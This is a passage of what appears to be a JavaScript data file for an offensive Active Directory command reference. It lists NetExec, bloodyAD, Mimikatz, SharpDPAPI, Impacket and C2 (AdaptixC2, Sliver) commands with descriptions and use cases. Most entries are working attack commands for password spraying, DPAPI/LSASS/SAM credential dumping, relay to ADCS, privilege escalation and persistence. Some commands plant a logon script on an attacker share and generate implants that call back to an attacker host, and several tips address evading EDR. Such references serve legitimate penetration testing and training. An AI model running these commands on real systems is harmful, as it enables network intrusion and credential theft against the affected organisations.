    command: "Set-ADAccountPassword -Identity $TARGETOBJECT -NewPassword (ConvertTo-SecureString '$PASS' -AsPlainText -Force) -Reset",
    description: "Built-in RSAT ActiveDirectory module cmdlet for resetting a password — no PowerView or third-party tooling needed if the module is already present.",
    useCase: "The most 'living off the land' password reset option — RSAT tools are far less likely to be flagged than offensive-named tooling.",
  },
  {
    id: "native-get-aduser-noreqpreauth",
    tool: "Get-ADUser",
    phase: "recon",
    title: "Find AS-REP roastable users (native module)",
    command: "Get-ADUser -Filter * -Properties DoesNotRequirePreAuth | Where-Object {$_.DoesNotRequirePreAuth -eq 'True' -and $_.Enabled -eq 'True'}",
    description: "Filters directly on the DoesNotRequirePreAuth property using only the built-in ActiveDirectory module — no PowerView, Rubeus, or Impacket needed.",
    useCase: "AS-REP roast target discovery on a host where only RSAT tools are available or tolerated.",
  },
  {
    id: "net-user-password-reset",
    tool: "net",
    phase: "cred",
    title: "Reset a password with the built-in net command",
    command: "net user $TARGETOBJECT $PASS /domain",
    description: "The simplest possible password reset — a completely built-in Windows command, given the right rights over the target account.",
    useCase: "Zero-tooling password reset when even RSAT/PowerView aren't available — works from any Windows box with network access to a DC.",
  },


  // ============ ADDITIONAL NETEXEC MODULES ============

  {
    id: "nxc-gen-relay-list",
    tool: "NetExec (nxc)",
    phase: "recon",
    title: "Find hosts without SMB signing (relay targets)",
    command: "nxc smb $TARGET --gen-relay-list relay.txt",
    description: "Checks every host in scope for SMB signing enforcement and writes the ones without it to a file — exactly the target list ntlmrelayx needs.",
    useCase: "Building a relay target list before starting a Responder/coercion + ntlmrelayx chain, instead of relaying blind.",
  },
  {
    id: "nxc-smb-getfile",
    tool: "NetExec (nxc)",
    phase: "lateral",
    title: "Pull a specific file from a share",
    command: "nxc smb $TARGET -u $USER -p $PASS --get-file remote_file.txt local_file.txt --share SHARENAME",
    description: "Downloads one specific file from a named share in a single command, without opening an interactive smbclient session.",
    useCase: "Quick one-off file retrieval once smbmap/spider_plus has already told you what's worth pulling.",
  },
  {
    id: "nxc-ssh-spray",
    tool: "NetExec (nxc)",
    phase: "cred",
    title: "Password spray over SSH",
    command: "nxc ssh $TARGET -u $USER -p $PASS --continue-on-success",
    description: "Same spraying/validation workflow as nxc smb, but against SSH — useful in mixed Windows/Linux estates or against Linux-joined AD hosts.",
    useCase: "Extending a password spray beyond Windows/SMB to any Linux boxes in scope that accept the same credentials.",
  },
  {
    id: "nxc-ldap-maq",
    tool: "NetExec (nxc)",
    phase: "recon",
    title: "Check MachineAccountQuota",
    command: "nxc ldap $TARGET -u $USER -p $PASS -M maq",
    description: "Reads the domain's MachineAccountQuota value — how many computer accounts the current user is still allowed to create.",
    useCase: "Confirming machine-account creation is actually available before attempting RBCD setup or Certifried-style attacks — MAQ is sometimes set to 0 specifically to block this.",
  },
  {
    id: "nxc-ldap-pre2k",
    tool: "NetExec (nxc)",
    phase: "cred",
    title: "Find pre-Windows-2000 compatible computer accounts",
    command: "nxc ldap $TARGET -u $USER -p $PASS -M pre2k",
    description: "Finds computer accounts created with the legacy 'Pre-Windows 2000 Compatible Access' default, whose initial password is predictable — the lowercase computer name itself.",
    useCase: "A frequently-overlooked credential-access path: any pre-2000-style computer account whose password was never changed is instantly guessable.",
  },
  {
    id: "nxc-ldap-adcs-module",
    tool: "NetExec (nxc)",
    phase: "cred",
    title: "Enumerate ADCS via a built-in module",
    command: "nxc ldap $TARGET -u $USER -p $PASS -M adcs",
    description: "NetExec's own ADCS enumeration module — a lighter-weight alternative to Certipy find when nxc is already the tool in hand.",
    useCase: "Quick ADCS exposure check without switching to a separate Certipy invocation.",
  },
  {
    id: "nxc-ldap-find-delegation",
    tool: "NetExec (nxc)",
    phase: "recon",
    title: "Find all delegation configurations",
    command: "nxc ldap $TARGET -u $USER -p $PASS --find-delegation",
    description: "Built-in equivalent to Impacket's findDelegation.py — lists every account configured for unconstrained, constrained, or resource-based constrained delegation.",
    useCase: "One less separate tool to stage when nxc is already running the LDAP enumeration pass.",
  },
  {
    id: "nxc-smb-dpapi",
    tool: "NetExec (nxc)",
    phase: "cred",
    title: "Extract and decrypt DPAPI secrets",
    command: "nxc smb $TARGET -u $USER -p $PASS --dpapi",
    description: "Pulls DPAPI-protected secrets (saved browser/RDP/WiFi credentials, certificates) from the target and attempts to decrypt them using the domain backup key or the user's own credential.",
    useCase: "Harvesting credentials that live outside LSASS/SAM entirely — DPAPI secrets are a frequently-overlooked credential source.",
  },
  {
    id: "sharpdpapi-triage",
    tool: "SharpDPAPI",
    phase: "cred",
    title: "Triage the current user's DPAPI secrets",
    command: "SharpDPAPI.exe triage",
    description: "GhostPack's DPAPI tool — automatically finds and decrypts the current user's Chrome/Edge saved passwords and cookies, RDCMan.settings, and Credential Manager entries, deriving the master key from the user's own logon credential.",
    useCase: "Fast credential/session harvesting from an interactive user context — often turns up cleartext browser-saved passwords for other systems.",
  },
  {
    id: "sharpdpapi-machinetriage",
    tool: "SharpDPAPI",
    phase: "cred",
    title: "Triage machine-level DPAPI secrets (SYSTEM)",
    command: "SharpDPAPI.exe machinetriage",
    description: "Same triage as above, but for SYSTEM-context DPAPI blobs (machine masterkeys) — needs local admin/SYSTEM, and reaches secrets other users on the box have protected with the machine key rather than their own.",
    useCase: "Run right after a local admin/SYSTEM foothold to sweep every user's machine-scoped DPAPI secrets on that host in one pass.",
  },
  {
    id: "mimikatz-dpapi-backupkey",
    tool: "Mimikatz",
    phase: "cred",
    title: "Extract the domain's DPAPI backup key",
    command: "lsadump::backupkeys /system:$DC /export",
    description: "Dumps the domain-wide DPAPI backup key pair, which exists so a user's DPAPI data isn't permanently lost if their password is reset — as a side effect, it can decrypt any domain user's DPAPI blobs offline, with no interaction with that user's account at all. Requires Domain Admin (or equivalent) to run once.",
    useCase: "The prerequisite for the SharpDPAPI domain-wide decryption entry below — a single extraction unlocks every domain user's DPAPI-protected secrets.",
  },
  {
    id: "sharpdpapi-domain-backupkey",
    tool: "SharpDPAPI",
    phase: "cred",
    title: "Decrypt any domain user's DPAPI blobs with the backup key",
    command: "SharpDPAPI.exe credentials /pvk:$OUTFILE.pem",
    description: "Given the domain's DPAPI backup key (see the Mimikatz lsadump::backupkeys entry above), decrypts any domain user's DPAPI-protected blobs offline — the backup key exists specifically so a lost master password doesn't lock out DPAPI data, which also makes it a domain-wide skeleton key for DPAPI.",
    useCase: "Domain Admin-equivalent reach into every domain user's saved credentials/cookies/certificates, from a single backup key extraction.",
  },
  {
    id: "donpapi-mass-collect",
    tool: "DonPAPI",
    phase: "cred",
    title: "Mass-harvest DPAPI secrets across many hosts",
    command: "DonPAPI.py collect -d $DOMAIN -u $USER -p $PASS -t $TARGET",
    description: "Remotely triages and decrypts DPAPI secrets (Wi-Fi keys, RDP/Credential Manager entries, Chrome/Edge saved passwords, certificates) across every reachable host in one pass — the SharpDPAPI workflow applied at domain scale instead of one host at a time.",
    useCase: "Sweeping an entire subnet for DPAPI-protected secrets in a single command instead of running SharpDPAPI/mimikatz triage host-by-host over a lateral movement session.",
  },
  {
    id: "nxc-ldap-gmsa",
    tool: "NetExec (nxc)",
    phase: "cred",
    title: "Enumerate and read gMSA passwords",
    command: "nxc ldap $TARGET -u $USER -p $PASS --gmsa",
    description: "Lists every gMSA the current account can read the managed password for, and dumps the resulting NT hash directly — built-in equivalent to gMSADumper.py.",
    useCase: "One-command gMSA credential harvesting without a separate tool.",
  },
  {
    id: "nxc-smb-gpp-module",
    tool: "NetExec (nxc)",
    phase: "cred",
    title: "Find and decrypt legacy GPP passwords",
    command: "nxc smb $TARGET -u $USER -p $PASS -M gpp_password",
    description: "Searches SYSVOL for legacy Group Policy Preferences XML files and decrypts any cpassword fields found — built-in equivalent to manually locating files and running gpp-decrypt.",
    useCase: "Automated version of the SYSVOL GPP password hunt, in the same tool already being used for other enumeration.",
  },
  {
    id: "nxc-smb-msol-module",
    tool: "NetExec (nxc)",
    phase: "cred",
    title: "Retrieve the AAD Connect (MSOL) sync account password",
    command: "nxc smb $TARGET -u $USER -p $PASS -M msol",
    description: "Built-in equivalent to AADInternals' Get-AADIntSyncCredentials — reads the AAD Connect sync account's credentials directly from the local AAD Connect server's configuration database.",
    useCase: "One-command version of the AAD Connect credential extraction step in the hybrid-identity DCSync chain, without needing PowerShell/AADInternals staged.",
  },
  {
    id: "nxc-smb-vuln-checks",
    tool: "NetExec (nxc)",
    phase: "recon",
    title: "Check for Zerologon, PetitPotam, and noPac in one pass",
    command: "nxc smb $TARGET -u $USER -p $PASS -M zerologon\nnxc smb $TARGET -u $USER -p $PASS -M petitpotam\nnxc smb $TARGET -u $USER -p $PASS -M nopac",
    description: "Three lightweight, non-destructive vulnerability-confirmation modules — each checks whether the target is exploitable without actually running the exploit.",
    useCase: "Safe triage of a target's exposure to these three headline vulnerabilities before committing to running the full (and in Zerologon's case, disruptive) exploit.",
  },
  {
    id: "nxc-smb-veeam",
    tool: "NetExec (nxc)",
    phase: "cred",
    title: "Extract credentials from a Veeam backup server",
    command: "nxc smb $TARGET -u $USER -p $PASS -M veeam",
    description: "Reads stored backup-job credentials directly out of Veeam's local SQL database — Veeam servers are routinely configured with domain admin-equivalent credentials for backup purposes.",
    useCase: "Backup infrastructure is frequently under-hardened relative to the privilege it holds — a compromised Veeam server is often a fast path to domain-wide credentials.",
  },
  {
    id: "nxc-smb-coerce-plus",
    tool: "NetExec (nxc)",
    phase: "privesc",
    title: "Test all known coercion methods at once",
    command: "nxc smb $TARGET -u $USER -p $PASS -M coerce_plus -o LISTENER=$ATTACKER",
    description: "Built-in equivalent to the standalone Coercer tool — tests PetitPotam, DFSCoerce, MS-EVEN, ShadowCoerce, and PrinterBug against the target in one pass.",
    useCase: "Fast coercion-method triage without staging five separate tools, when nxc is already the one running.",
  },


  // ============ ADDITIONAL BLOODYAD CAPABILITIES + BADSUCCESSOR ============

  {
    id: "bloodyad-add-genericall",
    tool: "bloodyAD",
    phase: "privesc",
    title: "Grant yourself GenericAll on an object",
    command: "bloodyAD --host $DC -d $DOMAIN -u $USER -p $PASS add genericAll $TARGETOBJECT $USER",
    description: "Directly grants the specified principal GenericAll on a target object (by DN or SID), given WriteDacl or ownership — bloodyAD's own version of the WriteDacl-abuse chain in one command instead of a separate dacledit.py call.",
    useCase: "The fastest single-command way to turn WriteDacl/Owns into full control once you're already using bloodyAD for everything else.",
  },
  {
    id: "bloodyad-enable-account",
    tool: "bloodyAD",
    phase: "evasion",
    title: "Re-enable a disabled account",
    command: "bloodyAD --host $DC -d $DOMAIN -u $USER -p $PASS remove uac $TARGETOBJECT -f ACCOUNTDISABLE",
    description: "Clears the ACCOUNTDISABLE flag from userAccountControl, given write access to the account.",
    useCase: "Cleanup after testing (re-enabling an account you disabled), or reactivating a disabled-but-still-privileged account found during enumeration.",
  },
  {
    id: "bloodyad-set-delegation-uac",
    tool: "bloodyAD",
    phase: "privesc",
    title: "Set a delegation UAC flag directly",
    command: "bloodyAD --host $DC -d $DOMAIN -u $USER -p $PASS add uac $TARGETOBJECT -f TRUSTED_TO_AUTH_FOR_DELEGATION",
    description: "Writes a userAccountControl delegation flag (protocol transition, etc.) directly onto a target account, given write access to it.",
    useCase: "Self-granting a delegation capability on an account you control write access to, without needing WriteAccountRestrictions-specific tooling.",
  },
  {
    id: "bloodyad-add-rbcd-native",
    tool: "bloodyAD",
    phase: "lateral",
    title: "Configure RBCD in one command",
    command: "bloodyAD --host $DC -d $DOMAIN -u $USER -p $PASS add rbcd $TARGETOBJECT 'ATTACKER$'",
    description: "bloodyAD's own built-in RBCD configuration — a single command replacing the separate rbcd.py write step.",
    useCase: "Setting up RBCD without switching to Impacket's rbcd.py when bloodyAD is already the tool in hand.",
  },
  {
    id: "bloodyad-get-bloodhound",
    tool: "bloodyAD",
    phase: "recon",
    title: "Collect BloodHound data (native collector)",
    command: "bloodyAD --host $DC -d $DOMAIN -u $USER -p $PASS get bloodhound",
    description: "bloodyAD's own built-in BloodHound collector — dumps the full graph (users, computers, groups, GPOs, OUs, trusts, ACLs) to a zip, without needing SharpHound, bloodhound-python, or nxc's collector.",
    useCase: "One less tool to stage when bloodyAD is already the one being used for everything else in the engagement.",
  },
  {
    id: "bloodyad-writelogonscript",
    tool: "bloodyAD",
    phase: "lateral",
    title: "Plant a malicious logon script",
    command: "bloodyAD --host $DC -d $DOMAIN -u $USER -p $PASS set object $TARGETOBJECT scriptPath -v '\\\\$ATTACKER\\share\\payload.bat'",
    description: "Overwrites a user's scriptPath attribute to point at an attacker-controlled script, which Windows runs automatically the next time that user logs on.",
    useCase: "Code execution as the target user the next time they authenticate — a quieter alternative to GPO-based persistence, scoped to just one account.",
  },
  {
    id: "bloodyad-maq-enum",
    tool: "bloodyAD",
    phase: "recon",
    title: "Check MachineAccountQuota on the domain root",
    command: "bloodyAD --host $DC -d $DOMAIN -u $USER -p $PASS get object 'DC=domain,DC=local' --attr ms-DS-MachineAccountQuota",
    description: "Reads the domain's MachineAccountQuota directly off the domain root object.",
    useCase: "Same check as nxc -M maq, useful when bloodyAD is already staged and you'd rather not switch tools.",
  },
  {
    id: "bloodyad-deleted-objects",
    tool: "bloodyAD",
    phase: "recon",
    title: "Find and restore deleted objects",
    command: "bloodyAD --host $DC -d $DOMAIN -u $USER -p $PASS get writable\nbloodyAD --host $DC -d $DOMAIN -u $USER -p $PASS set restore $TARGETOBJECT",
    description: "Lists writable objects including anything sitting in the Deleted Objects container, then restores a specific deleted object back to its original location.",
    useCase: "Tombstoned objects sometimes retain recoverable attribute data (including, occasionally, credential-adjacent info) before they're permanently purged — worth checking on any engagement with enough time for objects to have been recently deleted.",
  },
  {
    id: "bloodyad-badsuccessor",
    tool: "bloodyAD",
    phase: "privesc",
    title: "BadSuccessor — dMSA privilege inheritance abuse",
    command: "bloodyAD --host $DC -d $DOMAIN -u $USER -p $PASS add badSuccessor $TARGETOBJECT -t 'CN=administrator,CN=Users,DC=corp,DC=local' --ou 'OU=Employees,DC=corp,DC=local' --prepatch",
    description: "Creates a delegated Managed Service Account (dMSA — new in Windows Server 2025) and sets its msDS-ManagedAccountPrecededByLink attribute to point at a target account, which Windows treats as a privilege migration — the dMSA inherits the target's effective privileges.",
    useCase: "Full escalation to the target account's privilege level (commonly Domain Admin) from nothing more than Create Child rights on any OU — a dramatically lower bar than most other privesc primitives in this reference.",
  },


  // ============ KERBEROS PRACTICAL ADDITIONS ============

  {
    id: "nopac-faketime",
    tool: "faketime + noPac",
    phase: "privesc",
    title: "Run noPac with clock-skew correction",
    command: "faketime -f +7h python3 noPac.py $DOMAIN/$USER:$PASS -dc-ip $DC -use-ldap -shell --impersonate administrator",
    description: "Kerberos requires the client and DC clocks to be within a small tolerance (5 minutes by default) — faketime shifts the local clock just for this process when there's a known offset from the DC, without touching the actual system clock.",
    useCase: "The most common reason noPac (or any Kerberos-based tool) fails with a clock-skew error — wrap the command in faketime instead of trying to sync the whole attack box's clock.",
  },
  {
    id: "invoke-nopac-scan",
    tool: "Invoke-noPac",
    phase: "recon",
    title: "Scan for noPac vulnerability (PowerShell)",
    command: "Invoke-noPac -Command \"scan -domain $DOMAIN -user $USER -pass $PASS\"",
    description: "PowerShell alternative to the Python noPac.py — scan mode checks vulnerability without exploiting, useful for a non-destructive first pass.",
    useCase: "Confirming noPac exposure from a Windows foothold without needing Python staged.",
  },
  {
    id: "describeticket",
    tool: "Impacket (describeTicket.py)",
    phase: "cred",
    title: "Inspect a Kerberos ticket's contents",
    command: "describeTicket.py $OUTFILE",
    description: "Parses a .ccache or .kirbi ticket file and prints its readable contents — client/server principals, encryption type, flags, and validity window. Also prints the ticket session key, needed for some overpass-the-hash-style chains.",
    useCase: "Linux-side equivalent to Rubeus describe — inspecting a ticket obtained from another tool before deciding how to use it.",
  },
  {
    id: "smbpasswd-hash-set",
    tool: "Impacket (smbpasswd.py)",
    phase: "privesc",
    title: "Set an account's NT hash directly",
    command: "smbpasswd.py -newhashes :$HASH $DOMAIN/$USER:$PASS@$DC",
    description: "Sets a target account's NTLM hash directly (rather than a plaintext password) — used in SPN-less RBCD chains to set a controlled user's hash to a known TGT session key value.",
    useCase: "The key step in RBCD-without-a-machine-account: after obtaining a TGT session key via overpass-the-hash, this sets your controlled user's hash to that key so a U2U-based S4U2Proxy request will succeed.",
  },
  {
    id: "rbcd-spnless-note",
    tool: "RBCD (SPN-less)",
    phase: "privesc",
    title: "RBCD when MachineAccountQuota is 0",
    command: "rbcd.py -delegate-from '$USER' -delegate-to '$TARGETOBJECT$' -action write $DOMAIN/$USER:$PASS -dc-ip $DC",
    description: "RBCD's -delegate-from doesn't have to be a machine account — a normal user account works too, since the technique only depends on being able to write the target's delegation attribute, not on the delegate-from principal's type. This sidesteps needing MachineAccountQuota at all.",
    useCase: "RBCD still works even in hardened environments that have set MachineAccountQuota to 0 specifically to block computer-account creation — as long as you control any user account to use as the delegate-from principal.",
  },
  {
    id: "pywhisker",
    tool: "pywhisker",
    phase: "cred",
    title: "Shadow Credentials attack (pywhisker)",
    command: "pywhisker.py -u $USER -p $PASS -d $DOMAIN --target $TARGETOBJECT --action add",
    description: "Python/Linux implementation of the Whisker Shadow Credentials technique — writes a key credential and prints the corresponding PKINIT authentication command.",
    useCase: "Linux-side alternative to certipy shadow / Whisker.exe when those aren't the tools already staged.",
  },

  // ============ GAPS FROM PERSONAL VAULT NOTES (Mimikatz/NXC/rpcclient/smbclient/etc.) ============

  // --- Certipy: Kerberos ticket auth ---
  {
    id: "certipy-find-kerberos",
    tool: "Certipy",
    phase: "recon",
    title: "Enumerate ADCS using an existing Kerberos ticket",
    command: "certipy find -k -target $DC -dc-ip $DC -enabled -vulnerable -stdout",
    description: "Runs the same ADCS misconfiguration scan as certipy find, but authenticates with an already-cached Kerberos ticket (KRB5CCNAME) instead of a username/password or hash.",
    useCase: "Continuing ADCS enumeration right after obtaining a ticket via getST.py/getTGT.py, without needing to re-supply credentials.",
  },

  // --- Impacket: ntlmrelayx native ADCS relay, psexec via Kerberos ---
  {
    id: "ntlmrelayx-adcs-native",
    tool: "Impacket (ntlmrelayx.py)",
    phase: "cred",
    title: "Relay directly to ADCS web enrollment (built-in ESC8 support)",
    command: "sudo ntlmrelayx.py --adcs --template DomainController -t http://$DC/certsrv/certfnsh.asp -smb2support",
    description: "ntlmrelayx's own --adcs flag relays captured/coerced NTLM auth straight into a certificate request against the specified template — an alternative to certipy relay that stays within the Impacket toolchain.",
    useCase: "Running the ESC8 relay chain without switching to Certipy, when ntlmrelayx is already the tool in hand for the coercion setup.",
  },
  {
    id: "impacket-psexec-kerberos",
    tool: "Impacket (psexec.py)",
    phase: "lateral",
    title: "psexec using an existing Kerberos ticket",
    command: "psexec.py -k -no-pass $DOMAIN/administrator@$DC",
    description: "Authenticates using the cached Kerberos ticket (KRB5CCNAME) instead of a password or hash — -no-pass skips prompting since the ticket alone is sufficient.",
    useCase: "Using a forged or captured ticket (golden/silver/diamond, or one obtained via getST.py) directly for lateral movement without extracting a hash first.",
  },

  // --- Ligolo-ng: route conflict resolution ---
  {
    id: "ligolo-route-conflict",
    tool: "Ligolo-ng",
    phase: "pivot",
    title: "Resolve a route conflict with an existing tunnel",
    command: "sudo ip route del $TARGET/24 dev tun0",
    description: "If the target subnet overlaps with a route already claimed by another active tunnel (a VPN, a previous Ligolo session, etc.), the new route add will silently fail or misroute until the conflicting one is removed.",
    useCase: "The fix when `ip route add` for a new Ligolo tunnel doesn't seem to take effect — check `ip route` first for a pre-existing conflicting route over the same range.",
  },

  // --- Mimikatz: offline hive parsing, cached creds, vault ---
  {
    id: "mimikatz-minidump-load",
    tool: "Mimikatz",
    phase: "cred",
    title: "Parse an offline LSASS minidump",
    command: "sekurlsa::minidump lsass.dmp\nsekurlsa::logonpasswords",
    description: "Loads a previously-created LSASS minidump file (from comsvcs.dll, ProcDump, Task Manager, etc.) into Mimikatz and runs the normal credential-parsing logic against it, instead of the live process.",
    useCase: "Extracting credentials from a dump created on a monitored host via a quieter LOLBin method, then parsing it separately on a safer machine — avoids running Mimikatz itself on the monitored target.",
  },
  {
    id: "mimikatz-offline-hive-dump",
    tool: "Mimikatz",
    phase: "cred",
    title: "Dump SAM/LSA secrets from offline SAM+SYSTEM hives",
    command: "reg save HKLM\\SAM C:\\Temp\\SAM\nreg save HKLM\\SYSTEM C:\\Temp\\SYSTEM\nlsadump::sam /sam:C:\\Temp\\SAM /system:C:\\Temp\\SYSTEM\nlsadump::secrets /sam:C:\\Temp\\SAM /system:C:\\Temp\\SYSTEM",
    description: "Backs up the SAM and SYSTEM registry hives, then feeds them to Mimikatz's offline lsadump modules — sam for local account hashes, secrets for LSA secrets (service account passwords, autologon credentials).",
    useCase: "Extracting local credentials without touching LSASS at all, useful when EDR is specifically watching for LSASS access.",
  },
  {
    id: "mimikatz-cached-creds",
    tool: "Mimikatz",
    phase: "cred",
    title: "Dump cached domain logon credentials",
    command: "lsadump::cache /system:C:\\Temp\\SYSTEM /sam:C:\\Temp\\SAM",
    description: "Extracts MSCache/MSCacheV2 entries — the cached domain credential hashes Windows keeps locally so domain accounts can still log on when a DC is unreachable.",
    useCase: "A distinct credential source from SAM/LSA secrets — useful on laptops or hosts that regularly operate offline from the domain, which cache more logons than usual.",
  },
  {
    id: "mimikatz-vault",
    tool: "Mimikatz",
    phase: "cred",
    title: "Export Windows Credential Vault entries",
    command: "vault::list\nvault::cred /export",
    description: "Lists and exports credentials stored in the Windows Credential Vault — a separate credential store from DPAPI-protected browser/app secrets, used for things like scheduled task run-as credentials and some RDP-saved logins.",
    useCase: "A frequently-overlooked credential source distinct from both LSASS and DPAPI — worth checking on any host with saved RDP connections or scheduled tasks running as another user.",
  },

  // --- NetExec: practical enumeration patterns and missing flags ---
  {
    id: "nxc-ridbrute-to-userlist",
    tool: "NetExec (nxc)",
    phase: "recon",
    title: "Turn RID-brute output into a clean username list",
    command: "nxc smb $TARGET -u 'guest' -p '' --rid-brute 3000 | grep SidTypeUser | cut -d '\\\\' -f 2 | cut -d ' ' -f 1 > valid_usernames.txt",
    description: "Pipes raw rid-brute output through grep/cut to strip it down to just the usernames, ready to feed straight into a password spray.",
    useCase: "Going from anonymous RID enumeration to a spray-ready username file in one line, instead of manually cleaning up the output.",
  },
  {
    id: "nxc-username-as-password",
    tool: "NetExec (nxc)",
    phase: "cred",
    title: "Test username-as-password across every account",
    command: "nxc smb $TARGET -u valid_usernames.txt -p valid_usernames.txt --no-bruteforce --continue-on-success",
    description: "Pairs the same username file as both the user and password list with --no-bruteforce (line-by-line pairing instead of full cartesian product), testing whether each account's password is simply its own username.",
    useCase: "A surprisingly common finding, especially for freshly-created or default-config service accounts — worth trying before a full password spray.",
  },
  {
    id: "nxc-smb-loggedon-users",
    tool: "NetExec (nxc)",
    phase: "recon",
    title: "See who's currently logged on to a host",
    command: "nxc smb $TARGET -u $USER -p $PASS --loggedon-users",
    description: "Lists the users currently logged into the target — both interactive and network sessions.",
    useCase: "Direct complement to the HasSession edge in Attack Paths — confirms in real time whether a privileged user is actually on the box right now, worth dumping LSASS for.",
  },
  {
    id: "nxc-smb-sessions",
    tool: "NetExec (nxc)",
    phase: "recon",
    title: "Enumerate active SMB sessions",
    command: "nxc smb $TARGET -u $USER -p $PASS --sessions",
    description: "Lists active SMB sessions on the target, distinct from --loggedon-users (interactive/service logons) — this shows who currently has a share connection open.",
    useCase: "Another angle on 'who's touching this box right now,' useful alongside --loggedon-users for a fuller picture.",
  },
  {
    id: "nxc-smb-local-groups",
    tool: "NetExec (nxc)",
    phase: "recon",
    title: "Enumerate local group membership",
    command: "nxc smb $TARGET -u $USER -p $PASS --local-groups",
    description: "Lists local (not domain) groups and their membership on the target — distinct from --groups, which covers domain groups.",
    useCase: "Finding local Administrators/Remote Desktop Users membership that doesn't show up in domain-level group enumeration at all.",
  },
  {
    id: "nxc-smb-computers-disks",
    tool: "NetExec (nxc)",
    phase: "recon",
    title: "Enumerate domain computers and target disks",
    command: "nxc smb $TARGET -u $USER -p $PASS --computers\nnxc smb $TARGET -u $USER -p $PASS --disks",
    description: "--computers lists domain computer objects via SAMR; --disks lists the drives available on the target host.",
    useCase: "Quick recon fill-ins alongside --users/--groups when building out a fuller picture of the domain and a specific host.",
  },
  {
    id: "nxc-smb-exec-powershell",
    tool: "NetExec (nxc)",
    phase: "lateral",
    title: "Execute a PowerShell command instead of cmd",
    command: "nxc smb $TARGET -u $USER -p $PASS -X \"Get-Process\"",
    description: "Uppercase -X runs the command through PowerShell instead of cmd.exe (lowercase -x) — useful when the command needs PowerShell-specific syntax or cmdlets.",
    useCase: "Same execution primitive as -x, but for anything that only works in PowerShell.",
  },

  // --- rpcclient: what to actually run once connected ---
  {
    id: "rpcclient-enumdomusers",
    tool: "rpcclient",
    phase: "recon",
    title: "Enumerate domain users and groups from an RPC session",
    command: "enumdomusers\nenumdomgroups\nquerydispinfo",
    description: "Run inside an active rpcclient session (after connecting, e.g. via a null session) — enumdomusers/enumdomgroups list SAM objects directly, querydispinfo shows a fuller display-friendly listing of accounts.",
    useCase: "The actual enumeration payoff once rpcclient's null-session connection succeeds — connecting alone doesn't get you anything without these follow-up commands.",
  },
  {
    id: "rpcclient-lsaquery",
    tool: "rpcclient",
    phase: "recon",
    title: "Query the domain SID and policy info",
    command: "lsaquery",
    description: "Returns the domain SID and basic LSA policy information — the SID is needed for constructing RID-based lookups and for ticket-forging commands elsewhere.",
    useCase: "Grabbing the domain SID early, since several later techniques (golden tickets, RBCD SID references) need it.",
  },

  // --- smbclient: auth-mode variants ---
  {
    id: "smbclient-login-hash",
    tool: "smbclient",
    phase: "lateral",
    title: "Connect using pass-the-hash",
    command: "smbclient //$TARGET/SHARE -U $DOMAIN/$USER --pw-nt-hash $HASH",
    description: "Authenticates using an NTLM hash instead of a password — inside an active session, the equivalent interactive command is `login_hash {domain/username,lmhash:nthash}`.",
    useCase: "Browsing a share using a captured/dumped hash directly, without cracking it first.",
  },
  {
    id: "smbclient-kerberos-login",
    tool: "smbclient",
    phase: "lateral",
    title: "Connect using Kerberos authentication",
    command: "smbclient //$DC/SYSVOL -k",
    description: "Authenticates using an existing Kerberos ticket (KRB5CCNAME) rather than NTLM — requires the DNS-resolvable domain name rather than a bare IP for Kerberos to work correctly.",
    useCase: "Browsing shares with a forged/captured ticket, keeping the whole chain Kerberos-based rather than falling back to NTLM.",
  },

  // ============ C2 FRAMEWORKS — AdaptixC2 ============
  {
    id: "adaptixc2-server-start",
    tool: "AdaptixC2",
    phase: "c2",
    title: "Start the teamserver",
    command: "./adaptixserver -profile profile.json",
    description: "Launches the AdaptixC2 teamserver from a JSON profile defining listeners, operator credentials, and TLS settings — the server that agents check in to and operators connect to.",
    useCase: "First step of any AdaptixC2 engagement — run once on the attacker-controlled infrastructure box before connecting a client.",
  },
  {
    id: "adaptixc2-client-connect",
    tool: "AdaptixC2",
    phase: "c2",
    title: "Connect the operator client",
    command: "./adaptixclient",
    description: "Launches the cross-platform GUI client and connects to a running teamserver — listener creation, agent (beacon) generation, and tasking are primarily driven through this UI rather than further CLI flags.",
    useCase: "Multi-operator collaboration against the same teamserver, same model as Cobalt Strike's team server/client split.",
  },
  {
    id: "adaptixc2-socks",
    tool: "AdaptixC2",
    phase: "c2",
    title: "Start a SOCKS proxy through an agent",
    command: "socks start 1080",
    description: "Run from the agent's interactive console — pivots any SOCKS-aware tool (proxychains, browsers, nxc) through the compromised host's network position, the same role Ligolo-ng/Chisel play without a separate tunnel binary.",
    useCase: "Reaching internal segments only visible from the agent's foothold, without staging a separate pivoting tool on top of the C2 implant already there. Exact subcommand syntax can shift between releases — check `help` in the agent console if this doesn't match.",
  },
  {
    id: "adaptixc2-rportfwd",
    tool: "AdaptixC2",
    phase: "c2",
    title: "Reverse port forward through an agent",
    command: "rportfwd add 445 127.0.0.1 445",
    description: "Binds a port on the agent's host and forwards connections back to a target reachable from the operator's side — or the reverse direction depending on version, useful for exposing a listener to a segment the agent can reach but the operator can't.",
    useCase: "Catching a callback (e.g. a relayed auth attempt) from deeper in the pivoted network through the existing agent, without deploying Ligolo-ng/Chisel alongside it.",
  },

  // ============ C2 FRAMEWORKS — Sliver ============
  {
    id: "sliver-server-start",
    tool: "Sliver",
    phase: "c2",
    title: "Start the Sliver server console",
    command: "sliver-server",
    description: "Launches Sliver's server and interactive console together on the attacker box — for multi-operator setups, run the server as a daemon and connect separately with sliver-client using an exported operator config instead.",
    useCase: "Fastest path to a working C2 for solo engagements — listener creation, implant generation, and session interaction all happen from this one console.",
  },
  {
    id: "sliver-generate-implant",
    tool: "Sliver",
    phase: "c2",
    title: "Generate an HTTPS implant",
    command: "generate --http $ATTACKER --save /tmp/implant --arch amd64",
    description: "Builds a standalone Sliver implant binary configured to call back over HTTPS to the attacker host — Sliver supports mTLS, HTTP(S), DNS, and Wireguard C2 channels via the equivalent --mtls/--dns/--wg flags.",
    useCase: "Producing the payload to deliver to a target before it ever touches the network — pick the C2 channel that best survives the target's egress filtering.",
  },
  {
    id: "sliver-listener-mtls",
    tool: "Sliver",
    phase: "c2",
    title: "Start an mTLS listener",
    command: "mtls --lhost 0.0.0.0 --lport 8888",
    description: "Starts a mutual-TLS listener — Sliver's most heavily-encrypted and least fingerprintable default C2 channel, since both sides authenticate via certificate rather than relying on HTTP traffic blending in.",
    useCase: "Preferred channel when the target network doesn't force all egress through an inspected HTTP proxy.",
  },
  {
    id: "sliver-socks5",
    tool: "Sliver",
    phase: "c2",
    title: "Start a SOCKS5 proxy through a session",
    command: "socks5 start",
    description: "Opens a local SOCKS5 listener on the operator box that tunnels through the active Sliver session — pair with proxychains to run nxc, impacket, or a browser through the compromised host.",
